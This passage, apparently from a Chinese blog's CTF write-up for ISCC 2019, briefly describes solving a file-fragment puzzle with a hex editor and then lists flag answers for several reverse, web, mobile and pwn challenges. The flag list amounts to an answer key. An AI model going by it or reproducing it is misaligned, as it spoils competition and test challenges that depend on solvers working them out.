再看看文本里的内容： 碎纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。 看起来是需要我们去里面得到相应的信息，可以需要拼图，对二进制进行操作，用winhex打开 现在就看有没有什么规律啥的，翻到最后，发现一个乱码是独立的而且就是由0和F组成，所以将其复制出来，在vscode中打开，然后查找0，可以得到 其他几个文件也是类似，这里就不做赘述，所以flag为：Flag={ISCC_is_so_interesting_!} 解密成绩单ISCC{Y0u_F0UnD_ThE_P4SSW0RD!} REV02flag{ST0RING_STAT1C_PA55WORDS_1N_FIL3S_1S_N0T_S3CUR3} REV03FLAG{I_LOVE_FONZY} Web5flag{1SCC_2OI9} Mobile1234567836275184 pwn02flag{2c9c6bd8-c285-43b7-ac8a-f74eb9a7cb2f} pwn01flag{f530c5ef-3a8a-4271-91f7-3c5ebd87fbe4} rev4http://ISCC2019{url_seems_rotten_with}ctf.com]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ISCC</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
